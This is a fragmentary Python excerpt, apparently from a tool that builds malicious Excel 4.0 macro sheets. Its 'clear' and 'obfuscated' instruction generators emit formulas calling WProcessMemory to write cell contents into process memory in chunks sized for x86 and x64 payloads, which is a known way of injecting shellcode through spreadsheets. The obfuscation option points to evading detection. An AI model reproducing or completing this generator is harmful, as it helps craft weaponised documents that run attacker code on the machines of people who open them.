...
def generateClearInstructions(args, x86Size, x64Size, x86Count, x64Count):
	...
	columnAList.append('=WProcessMemory(-1,' + mainCol + '10+(' + trackingCol + '1*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)\r\n')
...
def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64Count):
	...
	columnAList.append('=WProcessMemory(-1,R10C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)\r\n')
